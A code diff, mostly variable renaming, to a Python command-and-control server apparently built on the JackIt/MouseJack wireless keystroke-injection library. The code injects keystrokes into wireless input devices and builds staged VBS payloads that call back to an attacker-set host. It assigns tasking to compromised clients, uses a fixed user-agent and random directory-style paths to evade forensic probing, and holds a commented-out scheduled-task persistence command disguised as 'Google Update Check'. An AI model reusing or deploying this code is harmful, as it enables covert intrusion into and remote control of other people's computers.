@@ -22,70 +22,68 @@ from jackit import duckyparser
 from jackit import mousejack
 from jackit import plugins
 
-LogBasePath = os.path.join(os.getcwd(), "logs") 
-LocalListeningHost = "0.0.0.0"
-LocalListeningPort = 443
+log_base_path = os.path.join(os.getcwd(), "logs") 
 
-ListeningServerName = "<callback_address>"
-ListeningServerPort = 443
+local_listening_host = "0.0.0.0"
+local_listening_port = 443
 
-SslEnabled = True
-SslKeyfile="keyfile.key"
-SslCertfile="certfile.crt"
+listening_server_name = "<callback_address>"
+listening_server_port = 443
+
+ssl_enabled = True
+ssl_key_path = "keyfile.key"
+ssl_cert_path = "certfile.crt"
 
 # OpenSSL command to generate a self-signed cert for SSL:
 # openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout keyfile.key -out certfile.crt
 
 # A unique User-Agent used as a test for against forensic probing
-ClientUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.1O2 Safari/537.36"
+client_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.1O2 Safari/537.36"
 
-FirstStagePayload = "VbsClientStage1.duck"
-SecondStagePayload = "VbsClientStage2_dynamic.vbs"
+first_stage_payload_path = "VbsClientStage1.duck"
+second_stage_payload_path = "VbsClientStage2_dynamic.vbs"
 
-GlobalSecondStageTaskingPath = "./Tasking/GlobalSecondStageTasking.txt"
-GlobalThirdStageTaskingPath = "./Tasking/GlobalThirdStageTasking.txt"
+global_second_stage_tasking_path = "./Tasking/GlobalSecondStageTasking.txt"
+global_third_stage_tasking_path = "./Tasking/GlobalThirdStageTasking.txt"
 
-UUID_Replace_String = "<client_uuid_00000000-0000-0000-0000-000000000000>"
-ServerName_Replace_String = "<server_host_name_example.com>"
-Port_Replace_String = "<server_port_443>"
-SSL_Replace_String = "<SSL_enabled_value_true/false>"
-MinWait_Replace_String = "<min_wait_5000>"
-MaxWait_Replace_String = "<max_wait_8000>"
-HttpPrefix_Replace_String = "<http_prefix>"
-HostAndPort_Replace_String = "<host_and_port>"
-UriPath_Replace_String = "<registered_uri_path>"
-UserAgent_Replace_String = "<client_user_agent>"
+uuid_replace_string = "<client_uuid_00000000-0000-0000-0000-000000000000>"
+server_name_replace_string = "<server_host_name_example.com>"
+port_replace_string = "<server_port_443>"
+ssl_replace_string = "<SSL_enabled_value_true/false>"
+min_wait_replace_string = "<min_wait_5000>"
+max_wait_replace_string = "<max_wait_8000>"
+http_prefix_replace_string = "<http_prefix>"
+host_and_port_replace_string = "<host_and_port>"
+uri_path_replace_string = "<registered_uri_path>"
+user_agent_replace_string = "<client_user_agent>"
 
 # Initial requests are limited to a 1KB size, until the Content-Length header can be found.
-InitialRecvBuffer = 1024
+initial_recv_buffer_size = 1024
 
 # The total request size is limited to 2^28 bytes (268 MB).
-MaxRecvSize = 268435456
-
-CurrentTaskingId = 1
+max_recv_size = 268435456
 
 # Regular expression for finding the Content-Length header.
-ContentLengthRe = re.compile("Content-Length:\s+(?P<ContentLength>\d+)")
+content_length_re = re.compile("Content-Length:\s+(?P<ContentLength>\d+)")
 
 # Regular expression for finding the ClientId value.
-UuidHeaderRe = re.compile("_user: (?P<ClientId>[a-zA-Z0-9]{8}-([a-zA-Z0-9]{4}-){3}[a-zA-Z0-9]{12})")
+uuid_header_re = re.compile("_user: (?P<ClientId>[a-zA-Z0-9]{8}-([a-zA-Z0-9]{4}-){3}[a-zA-Z0-9]{12})")
 
 # Regular expression for finding the client stage level.
-StageHeaderRe = re.compile("_x: (?P<StageLevel>\d+)")
+stage_header_re = re.compile("_x: (?P<StageLevel>\d+)")
 
 # Regular expression for finding the client's number of attempted callbacks.
-CallbackCountRe = re.compile("_y: (?P<CallbackCount>\d+)")
+callback_count_re = re.compile("_y: (?P<CallbackCount>\d+)")
 
 # Regular expression for finding the client user-agent string.
-UserAgentRe = re.compile("User-Agent:\s+(?P<UserAgent>.+?)\n")
+user_agent_re = re.compile("User-Agent:\s+(?P<UserAgent>.+?)\n")
 
 # Regular expression for finding the requested path value.
-UriPathRe = re.compile("(POST|GET) (?P<path>.+?) (HTTP/1\.1)")
-
-__version__ = 1.01
+uri_path_re = re.compile("(POST|GET) (?P<path>.+?) (HTTP/1\.1)")
 
 attack_log_path = "jhackit_attack_log.json"
 
+__version__ = 1.01
 
 # Console colors
 W = '\033[0m'  # white (normal)
@@ -97,23 +95,23 @@ P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
-TopPaths = []
-TopExtensions = []
+top_uri_paths = []
+top_uri_extensions = []
 with open("dirbuster-top1000.txt", "r") as f:
-    TopPaths = f.readlines()
+    top_uri_paths = f.readlines()
 with open("randomExtensions.txt", "r") as f:
-    TopExtensions = f.readlines()
+    top_uri_extensions = f.readlines()
 
 # Dictionary mapping client ID's to their individual tasking queues
-Clients = {}
+clients = {}
 
 # Global tasking counter
-CurrentTaskingId = 1
+current_tasking_id = 1
 
 # Dictionary mapping URI paths registered to a specific client ID.
-RegisteredPaths = {}
+registered_paths = {}
 
-ScheduledTaskName = "Google Update Check"
+scheduled_task_name = "Google Update Check"
 
 parser = argparse.ArgumentParser(description='Process some integers.')
 parser.add_argument('--debug', help='Enable debug.', action='store_true')
@@ -204,7 +202,7 @@ def get_log_line(LogLine, ClientId = ""):
 
 def get_second_stage_tasking_files():
     try:
-        with open(GlobalSecondStageTaskingPath, 'r') as f:
+        with open(global_second_stage_tasking_path, 'r') as f:
             return list(map(lambda x: x.strip(), f.readlines()))
     except:
         return []
@@ -212,19 +210,19 @@ def get_second_stage_tasking_files():
 
 def get_random_uri_path():
     pathCandidate = ""
-    while pathCandidate in RegisteredPaths or pathCandidate == "":
-        pathCandidate = random.choice(TopPaths).strip()
+    while pathCandidate in registered_paths or pathCandidate == "":
+        pathCandidate = random.choice(top_uri_paths).strip()
         if "." not in pathCandidate.split("/")[-1]:
             if not pathCandidate.endswith("/"):
                 pathCandidate = "{}/".format(pathCandidate)
-            pathCandidate = "{}{}.{}".format(pathCandidate, ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=random.randint(1,16))), random.choice(TopExtensions).strip())
+            pathCandidate = "{}{}.{}".format(pathCandidate, ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=random.randint(1,16))), random.choice(top_uri_extensions).strip())
     return pathCandidate
 
 
 def log_string(LogLine, ClientId = "", DoPrint = True):
-    LogFilePath = os.path.join(LogBasePath, ClientId + ".log")
+    LogFilePath = os.path.join(log_base_path, ClientId + ".log")
     if ClientId == "":
-        LogFilePath = os.path.join(LogBasePath, "Server.log")
+        LogFilePath = os.path.join(log_base_path, "Server.log")
     FormattedLogLine = get_log_line(LogLine, ClientId)
     with open(LogFilePath, 'a') as f:
         f.write(FormattedLogLine + "\n")
@@ -233,19 +231,19 @@ def log_string(LogLine, ClientId = "", DoPrint = True):
 
 
 def register_uri_path(ClientId, path=""):
-    global RegisteredPaths
+    global registered_paths
     if not path or path == "":
         path = get_random_uri_path()
-    RegisteredPaths[path] = ClientId
+    registered_paths[path] = ClientId
     return path
     
     
 def unregister_uri_path(path=""):
-    global RegisteredPaths
+    global registered_paths
     if not path or path == "":
         return
-    if path in RegisteredPaths:
-        del RegisteredPaths[path]
+    if path in registered_paths:
+        del registered_paths[path]
 
 
 def do_attack(jack, addr_string, target, attack_log, scan_only=False, layout="us", attack="", use_ping=True):
@@ -337,10 +335,10 @@ def scan_loop(jack, interval, address=None):
     
 class Tasking:
     def __init__(self, from_string=None, from_path=None, next_path=None, raw=False, *args, **kwargs):
-        global CurrentTaskingId
-        self.id = CurrentTaskingId
+        global current_tasking_id
+        self.id = current_tasking_id
         self.is_valid = False
-        CurrentTaskingId += 1
+        current_tasking_id += 1
         self.raw = raw
         self.next_path = next_path
         self.results = None
@@ -382,7 +380,7 @@ class Tasking:
 
 class Client:
     def __init__(self, id=None, stage=0, initial_path=None, device_address=None):
-        global Clients
+        global clients
         self.connections = 0
         self.device_address = device_address
         
@@ -398,14 +396,14 @@ class Client:
         self.min_wait = 5000
         self.port = 0
         self.remote_connection_count = 0
-        self.server_address = ListeningServerName
-        self.server_port = ListeningServerPort
+        self.server_address = listening_server_name
+        self.server_port = listening_server_port
         self.sent_tasking = []
-        self.ssl_enabled = SslEnabled
+        self.ssl_enabled = ssl_enabled
         self.stage = stage
         self.tasking = collections.deque([])
         
-        Clients[self.id] = self
+        clients[self.id] = self
         
     
     # Add tasking to the Client's tasking deque. Default action is to append new tasking to the end.
@@ -431,24 +429,24 @@ class Client:
     def get_first_stage(self):
         Payload = ""
         try:
-            with open(FirstStagePayload, "r") as f:
+            with open(first_stage_payload_path, "r") as f:
                 Payload = f.read()
         except:
             return
         if self.ssl_enabled:
-            Payload = Payload.replace(HttpPrefix_Replace_String, "https")
+            Payload = Payload.replace(http_prefix_replace_string, "https")
         else:
-            Payload = Payload.replace(HttpPrefix_Replace_String, "http")
-        if (self.ssl_enabled and ListeningServerPort == "443") or (not self.ssl_enabled and ListeningServerPort == "80"):
-            Payload = Payload.replace(HostAndPort_Replace_String, ListeningServerName)
+            Payload = Payload.replace(http_prefix_replace_string, "http")
+        if (self.ssl_enabled and self.server_port == "443") or (not self.ssl_enabled and self.server_port == "80"):
+            Payload = Payload.replace(host_and_port_replace_string, self.server_address)
         else:
-            Payload = Payload.replace(HostAndPort_Replace_String, "{}:{}".format(ListeningServerName, ListeningServerPort))
-        Payload = Payload.replace(UriPath_Replace_String, self.initial_path)
+            Payload = Payload.replace(host_and_port_replace_string, "{}:{}".format(self.server_address, self.server_port))
+        Payload = Payload.replace(uri_path_replace_string, self.initial_path)
         print("[+] Generated first-stage payload for {}".format(self.id))
         
-        #with open((os.path.join(LogBasePath,"first_stage_payload.duck")), "w") as f:
+        #with open((os.path.join(log_base_path,"first_stage_payload.duck")), "w") as f:
         #    f.write(Payload)
-        #print("[+] Generated first-stage duck payload: {}".format((os.path.join(LogBasePath,"first_stage_payload.duck"))))
+        #print("[+] Generated first-stage duck payload: {}".format((os.path.join(log_base_path,"first_stage_payload.duck"))))
         
         return Payload
         
@@ -456,41 +454,41 @@ class Client:
     def get_second_stage(self):
         Payload = ""
         try:
-            with open(SecondStagePayload, "r") as f:
+            with open(second_stage_payload_path, "r") as f:
                 Payload = f.read()
         except:
             return
             
-        Payload = Payload.replace(UUID_Replace_String, self.id)
-        Payload = Payload.replace(ServerName_Replace_String, ListeningServerName)
-        Payload = Payload.replace(Port_Replace_String, str(LocalListeningPort))
-        Payload = Payload.replace(MinWait_Replace_String, str(self.min_wait))
-        Payload = Payload.replace(MaxWait_Replace_String, str(self.max_wait))
-        Payload = Payload.replace(UriPath_Replace_String, self.initial_path)
-        Payload = Payload.replace(UserAgent_Replace_String, ClientUserAgent)
+        Payload = Payload.replace(uuid_replace_string, self.id)
+        Payload = Payload.replace(server_name_replace_string, self.server_address)
+        Payload = Payload.replace(port_replace_string, str(self.server_port))
+        Payload = Payload.replace(min_wait_replace_string, str(self.min_wait))
+        Payload = Payload.replace(max_wait_replace_string, str(self.max_wait))
+        Payload = Payload.replace(uri_path_replace_string, self.initial_path)
+        Payload = Payload.replace(user_agent_replace_string, client_user_agent)
 
         if self.ssl_enabled:
-            Payload = Payload.replace(HttpPrefix_Replace_String, "https")
+            Payload = Payload.replace(http_prefix_replace_string, "https")
         else:
-            Payload = Payload.replace(HttpPrefix_Replace_String, "http")
+            Payload = Payload.replace(http_prefix_replace_string, "http")
         print("[+] Generated second-stage payload for {}".format(self.id))
             
-        #with open((os.path.join(LogBasePath,"second_stage_payload.vbs")), "w") as f:
+        #with open((os.path.join(log_base_path,"second_stage_payload.vbs")), "w") as f:
         #    f.write(Payload)
-        #print("[+] Generated second-stage payload: {}".format((os.path.join(LogBasePath,"second_stage_payload.vbs"))))
+        #print("[+] Generated second-stage payload: {}".format((os.path.join(log_base_path,"second_stage_payload.vbs"))))
         
         return Payload
 
 
     def register_callback(self, path, data=""):
-        StageMatch = StageHeaderRe.search(data)
+        StageMatch = stage_header_re.search(data)
         try:
             if StageMatch:
                 self.stage = int(StageMatch.group("StageLevel"))
         except:
             pass
             
-        CallbackCountMatch = CallbackCountRe.search(data)
+        CallbackCountMatch = callback_count_re.search(data)
         try:
             if CallbackCountMatch:
                 self.remote_connection_count = int(CallbackCountMatch.group("CallbackCount"))
@@ -502,8 +500,12 @@ class Client:
         if path.startswith(self.initial_path):
         
             # It could either be a second-stage client, calling back for its first tasking
-            if UuidHeaderRe.search(data) and self.stage <= 2:
+            if uuid_header_re.search(data) and self.stage <= 2:
                 log_string("[+] First connection from second-stage client {}:{}".format(self.ip_address, self.port), self.id)
+                
+                if self.device_address:
+                    print((G+"[+] Successfully pwnt client {} through device '{}'!"+W).format(self.id, self.device_address))
+                
                 self.stage = 2
                 for SecondStagePath in get_second_stage_tasking_files():
                     self.add_tasking(Tasking(from_path=SecondStagePath))
@@ -567,9 +569,9 @@ class Client:
     
     def set_callback_host(self, host="", port="", push=False):
         if host == "":
-            host = ListeningServerName
+            host = self.server_address
         if port == "":
-            port = ListeningServerPort
+            port = self.server_port
         log_string("[!] Tasking SETCALLBACKHOST({}, {}) on client.".format(host, port), self.id)
         self.add_tasking(Tasking(from_string=("Server = \"{}\"\r\Port = \"{}\"".format(host, port))), push)
         
@@ -598,39 +600,39 @@ class Client:
     #        return
     #    if push:
     #        self.add_tasking(Tasking(command="EXIT"), push)
-    #    self.add_tasking(Tasking(command="SILENTCMD", CMD=("SchTasks /Create /SC MINUTE /MO 15 /K /ED {} /Z /F /TN \"{}\" /TR \"{}\" /ST {}".format(get_days_from_now(30), ScheduledTaskName, remotepath, get_minutes_from_now(15)))), push)
+    #    self.add_tasking(Tasking(command="SILENTCMD", CMD=("SchTasks /Create /SC MINUTE /MO 15 /K /ED {} /Z /F /TN \"{}\" /TR \"{}\" /ST {}".format(get_days_from_now(30), scheduled_task_name, remotepath, get_minutes_from_now(15)))), push)
     #    if not push:
     #        self.add_tasking(Tasking(command="EXIT"), push)
 
 
 class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
     def handle(self):
-        global Clients
+        global clients
         ClientId = ""
         ClientIdFromMatch = None
         ClientIdFromPath = None
         
         # Receive the first 1024 bytes of the initial connection.
-        self.data = str(self.request.recv(InitialRecvBuffer), "utf-8")
+        self.data = str(self.request.recv(initial_recv_buffer_size), "utf-8")
         SourceAddress, SourcePort = self.request.getpeername()
         
         # If no data was received, do not respond to whatever this connection is.
         if len(self.data) == 0:
             return
         
-        UriPathMatch = UriPathRe.search(self.data)
+        UriPathMatch = uri_path_re.search(self.data)
         if not UriPathMatch:
             return
         RequestedPath = UriPathMatch.group("path")
         
         # Get the ClientId from the request path.
-        ClientIdMatch = UuidHeaderRe.search(self.data)
+        ClientIdMatch = uuid_header_re.search(self.data)
         
         if ClientIdMatch:
             ClientIdFromMatch = ClientIdMatch.group("ClientId")
             
-        if RequestedPath.split("?")[0] in RegisteredPaths:
-            ClientIdFromPath = RegisteredPaths[RequestedPath.split("?")[0]]
+        if RequestedPath.split("?")[0] in registered_paths:
+            ClientIdFromPath = registered_paths[RequestedPath.split("?")[0]]
         else:
             log_string("[!] Warning: Path not registered for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
             log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
@@ -641,25 +643,25 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
             log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
             return
         
-        if ClientIdFromMatch and ClientIdFromMatch in Clients:
+        if ClientIdFromMatch and ClientIdFromMatch in clients:
             ClientId = ClientIdFromMatch
-        elif ClientIdFromPath and ClientIdFromPath in Clients:
+        elif ClientIdFromPath and ClientIdFromPath in clients:
             ClientId = ClientIdFromPath
         else:
             log_string("[!] Connection from unknown client {}:{} at {}".format(SourceAddress, SourcePort, RequestedPath), "", True)
             log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
             return
 
-        CurrentClient = Clients[ClientId]
+        CurrentClient = clients[ClientId]
         
         if CurrentClient.remote_connection_count > 0 and RequestedPath.startswith(CurrentClient.initialpath):
             log_string("[!] Warning: Potential replay detected for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
             log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
             return
             
-        UserAgentMatch = UserAgentRe.search(self.data)
+        UserAgentMatch = user_agent_re.search(self.data)
         
-        if CurrentClient.remote_connection_count > 0 and (not UserAgentMatch or UserAgentMatch.group("UserAgent").strip() != ClientUserAgent.strip()):
+        if CurrentClient.remote_connection_count > 0 and (not UserAgentMatch or UserAgentMatch.group("UserAgent").strip() != client_user_agent.strip()):
             log_string("[!] User-Agent does not match expected value for {}:{} at:\n\t{}".format(SourceAddress, SourcePort, RequestedPath), "", True)
             log_string("[!] Warning: Ending connection with {}:{}...".format(SourceAddress, SourcePort), "", True)
             return
@@ -670,14 +672,14 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
         log_string("[!] Connection from known client {}:{} => {}".format(SourceAddress, SourcePort, CurrentClient.id), "", False)
         
         # Look for the Content-Length header to figure out how much data to receive.
-        ContentLengthMatch = ContentLengthRe.search(self.data)
+        ContentLengthMatch = content_length_re.search(self.data)
         
         # If the header was found, consider receiving any unreceived bytes.
         if ContentLengthMatch:
             try:
                 # If content-length implies there is more data to receive, though less data than the maximum allowable size, try to receive it.
-                if int(ContentLengthMatch.group("ContentLength")) + len(self.data) > 0 and int(ContentLengthMatch.group("ContentLength")) + len(self.data) <= MaxRecvSize:
-                    #log_string("[*] Request Content-Length larger than InitialRecvBuffer - Receiving remaining data...", ClientId)
+                if int(ContentLengthMatch.group("ContentLength")) + len(self.data) > 0 and int(ContentLengthMatch.group("ContentLength")) + len(self.data) <= max_recv_size:
+                    #log_string("[*] Request Content-Length larger than initial_recv_buffer_size - Receiving remaining data...", ClientId)
                     
                     # It may be possible to DoS this server, given the remote host has control over the Content-Length header.
                     # Making requests with large Content-Length header values but small data may lead to resource mismanagement;
@@ -716,7 +718,7 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 class ThreadedTcpSslServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
     def server_bind(self):
         socketserver.TCPServer.server_bind(self)
-        self.socket = ssl.wrap_socket(self.socket, keyfile=SslKeyfile, certfile=SslCertfile, ssl_version=ssl.PROTOCOL_TLS_SERVER, server_side=True, do_handshake_on_connect=False)
+        self.socket = ssl.wrap_socket(self.socket, keyfile=ssl_key_path, certfile=ssl_cert_path, ssl_version=ssl.PROTOCOL_TLS_SERVER, server_side=True, do_handshake_on_connect=False)
     
     def get_request(self):
         (socket, addr) = socketserver.TCPServer.get_request(self)
@@ -753,10 +755,10 @@ def launch():
     print("[!] Starting local tasking server. Use CTRL-C to initiate shutdown.")
     
     # Create a new threaded server.
-    if SslEnabled:
-        server = ThreadedTcpSslServer((LocalListeningHost, LocalListeningPort), ThreadedTCPRequestHandler)
+    if ssl_enabled:
+        server = ThreadedTcpSslServer((local_listening_host, local_listening_port), ThreadedTCPRequestHandler)
     else:
-        server = ThreadedTcpServer((LocalListeningHost, LocalListeningPort), ThreadedTCPRequestHandler)
+        server = ThreadedTcpServer((local_listening_host, local_listening_port), ThreadedTCPRequestHandler)
         
     ip, port = server.server_address
     
@@ -805,8 +807,8 @@ def launch():
     except KeyboardInterrupt:
         print('[-] Quitting' + W)
 
-    with open('jhackit.out', 'w') as f:
-        f.write(json.dumps(jack.devices, cls=ComplexJSONEncoder, skipkeys=True, sort_keys=True, indent=4))
+    #with open('jhackit.out', 'w') as f:
+    #    f.write(json.dumps(jack.devices, cls=ComplexJSONEncoder, skipkeys=True, sort_keys=True, indent=4))
 
     update_attack_log(attack_log_path, attack_log)
 
